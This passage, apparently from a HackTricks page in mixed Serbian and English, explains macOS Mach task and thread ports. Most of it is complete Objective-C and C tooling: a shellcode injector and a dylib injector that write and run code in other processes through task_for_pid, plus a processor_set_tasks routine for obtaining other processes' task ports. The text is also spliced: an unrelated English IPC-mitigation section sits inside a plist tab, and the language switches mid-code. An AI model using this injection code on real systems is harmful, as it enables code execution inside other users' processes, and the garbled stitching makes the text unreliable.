Osim toga, task\_port je takođe **`vm_map`** port koji omogućava **čitanje i manipulaciju memorijom** unutar zadatka pomoću funkcija poput `vm_read()` i `vm_write()`. Ovo u osnovi znači da će zadatak sa SEND pravima nad task\_portom drugog zadatka biti u mogućnosti da **ubaci kod u taj zadatak**.

Zapamtite da je zato što je **jezgro takođe zadatak**, ako neko uspe da dobije **SEND dozvole** nad **`kernel_task`**, biće u mogućnosti da natera jezgro da izvrši bilo šta (jailbreaks).

* Pozovite `mach_task_self()` da **dobijete ime** za ovaj port za pozivački zadatak. Ovaj port se **nasleđuje** samo preko **`exec()`**; novi zadatak kreiran sa `fork()` dobija novi zadatak port (kao poseban slučaj, zadatak takođe dobija novi zadatak port nakon `exec()` u suid binarnom fajlu). Jedini način da pokrenete zadatak i dobijete njegov port je da izvršite ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) dok radite `fork()`.
* Ovo su ograničenja za pristup portu (iz `macos_task_policy` iz binarnog fajla `AppleMobileFileIntegrity`):
* Ako aplikacija ima **`com.apple.security.get-task-allow` privilegiju**, procesi od **istog korisnika mogu pristupiti zadatkovom portu** (obično dodato od strane Xcode-a za debagovanje). Proces notarizacije neće dozvoliti to u produkcijskim verzijama.
* Aplikacije sa **`com.apple.system-task-ports` privilegijom** mogu dobiti **zadatkov port za bilo** koji proces, osim jezgra. U starijim verzijama se nazivalo **`task_for_pid-allow`**. Ovo je dozvoljeno samo Apple aplikacijama.
* **Root može pristupiti zadatkovim portovima** aplikacija **koje nisu** kompajlovane sa **hardened** runtime-om (i ne od strane Apple-a).

**Port imena zadatka:** Neovlašćena verzija _zadatkovog porta_. Referiše na zadatak, ali ne dozvoljava kontrolu nad njim. Jedina stvar koja se čini dostupnom kroz njega je `task_info()`.

### Portovi niti

Niti takođe imaju povezane portove, koji su vidljivi iz zadatka pozivajući **`task_threads`** i iz procesora sa `processor_set_threads`. SEND pravo na port niti omogućava korišćenje funkcija iz podsistema `thread_act`, kao što su:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Bilo koja nit može dobiti ovaj port pozivajući **`mach_thread_sef`**.

### Ubacivanje shell koda u nit putem zadatkovog porta

Možete preuzeti shell kod sa:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## macOS IPC (Inter-Process Communication)

### macOS IPC Mechanisms

macOS provides several mechanisms for inter-process communication (IPC), including:

- **Mach Messages**: Low-level messaging system used by macOS for IPC.
- **XPC Services**: Lightweight inter-process communication mechanism.
- **Distributed Objects**: Allows objects to be used across process boundaries.
- **Apple Events**: Inter-application communication mechanism.
- **Unix Domain Sockets**: Communication between processes on the same host.

### IPC Abuse

- **Privilege Escalation**: Exploiting IPC mechanisms to escalate privileges.
- **Information Disclosure**: Extracting sensitive information through IPC.
- **Denial of Service (DoS)**: Disrupting system functionality by abusing IPC.

### Mitigation

To mitigate IPC abuse, follow these best practices:

- **Implement Proper Entitlements**: Limit the capabilities of IPC services using entitlements.
- **Validate Inputs**: Sanitize and validate inputs received through IPC mechanisms.
- **Use Secure Communication Channels**: Encrypt and authenticate IPC messages to prevent eavesdropping and tampering.
- **Monitor IPC Activity**: Monitor IPC calls for suspicious behavior and unauthorized access.

By understanding macOS IPC mechanisms and potential abuse scenarios, you can better secure your system against privilege escalation and other threats. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompajlujte** prethodni program i dodajte **ovlašćenja** kako biste mogli da ubacite kod sa istim korisnikom (ako ne, moraćete koristiti **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</detalji>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Da biste ovo omogućili na iOS-u, potrebno je imati dozvolu `dynamic-codesigning` kako biste mogli da napravite memorijski zapis koji je izvršiv.
{% endhint %}

### Ubacivanje Dylib-a u nit putem Task porta

Na macOS-u se **niti** mogu manipulisati putem **Mach** ili korišćenjem **posix `pthread` api**. Nit koju smo generisali u prethodnom ubacivanju, generisana je korišćenjem Mach api-ja, tako da **nije posix kompatibilna**.

Bilo je moguće **ubaciti jednostavan shellcode** za izvršavanje komande jer **nije bilo potrebno raditi sa posix** kompatibilnim api-jima, već samo sa Mach-om. **Složenije ubacivanje** bi zahtevalo da **nit** takođe bude **posix kompatibilna**.

Stoga, da biste **unapredili nit**, trebalo bi da pozovete **`pthread_create_from_mach_thread`** koji će **kreirati validnu pthread**. Zatim, ova nova pthread bi mogla **da pozove dlopen** kako bi **učitala dylib** sa sistema, tako da umesto pisanja novog shellcode-a za obavljanje različitih akcija, moguće je učitati prilagođene biblioteke.

Možete pronaći **primer dylib-ova** u (na primer onaj koji generiše log i zatim možete da ga slušate):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nije moguće postaviti dozvole memorije za kod udaljenog niti: Greška %s\n", mach_error_string(kr));
return (-4);
}

// Postavljanje dozvola na alociranu memoriju steka
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nije moguće postaviti dozvole memorije za stek udaljene niti: Greška %s\n", mach_error_string(kr));
return (-4);
}


// Kreiranje niti za izvršavanje shell koda
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // ovo je pravi stek
//remoteStack64 -= 8;  // potrebno je poravnanje od 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Udaljeni stek 64  0x%llx, Udaljeni kod je %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Nije moguće kreirati udaljenu nit: greška %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Upotreba: %s _pid_ _akcija_\n", argv[0]);
fprintf (stderr, "   _akcija_: putanja do dylib fajla na disku\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nije pronađen\n");
}

}
```
</detalji>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Preuzimanje niti putem Task porta <a href="#korak-1-preuzimanje-niti" id="korak-1-preuzimanje-niti"></a>

U ovoj tehnici se preuzima nit procesa:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Detekcija ubacivanja Task porta

Prilikom poziva `task_for_pid` ili `thread_create_*` povećava se brojač u strukturi zadatka iz jezgra koji se može pristupiti iz režima korisnika pozivajući task\_info(task, TASK\_EXTMOD\_INFO, ...)

## Portovi izuzetaka

Kada se desi izuzetak u niti, taj izuzetak se šalje određenom portu izuzetaka niti. Ako nit ne obradi izuzetak, tada se šalje portovima izuzetaka zadatka. Ako zadatak ne obradi izuzetak, tada se šalje host portu koji upravlja launchd-om (gde će biti potvrđen). Ovo se naziva trijaža izuzetaka.

Imajte na umu da će na kraju obično, ako se ne obradi pravilno, izveštaj završiti obrađen od strane demona ReportCrash. Međutim, moguće je da druga nit u istom zadatku upravlja izuzetkom, to je ono što alati za prijavu rušenja kao što je `PLCrashReporter` rade.

## Ostali objekti

### Sat

Svaki korisnik može pristupiti informacijama o satu, međutim, da bi postavio vreme ili izmenio druge postavke, mora imati administratorske privilegije.

Da biste dobili informacije, moguće je pozvati funkcije iz podsistema `clock` kao što su: `clock_get_time`, `clock_get_attributtes` ili `clock_alarm`\
Da biste izmenili vrednosti, podsistem `clock_priv` može se koristiti sa funkcijama poput `clock_set_time` i `clock_set_attributes`

### Procesori i skup procesora

API-ji procesora omogućavaju kontrolu jednog logičkog procesora pozivanjem funkcija poput `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Osim toga, API-ji **skupa procesora** pružaju način grupisanja više procesora u grupu. Moguće je dobiti podrazumevani skup procesora pozivajući **`processor_set_default`**.\
Ovo su neki zanimljivi API-ji za interakciju sa skupom procesora:

* `processor_set_statistics`
* `processor_set_tasks`: Vraća niz prava slanja svim zadacima unutar skupa procesora
* `processor_set_threads`: Vraća niz prava slanja svim nitima unutar skupa procesora
* `processor_set_stack_usage`
* `processor_set_info`

Kao što je pomenuto u [**ovom postu**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), u prošlosti je to omogućavalo zaobilaženje prethodno pomenute zaštite kako bi se dobili task portovi u drugim procesima radi njihove kontrole pozivanjem **`processor_set_tasks`** i dobijanjem host porta na svakom procesu.\
Danas je potrebno imati administratorske privilegije da biste koristili tu funkciju i to je zaštićeno, tako da ćete moći dobiti ove portove samo na nezaštićenim procesima.

Možete probati sa:

<details>

<summary><strong>Kod za processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
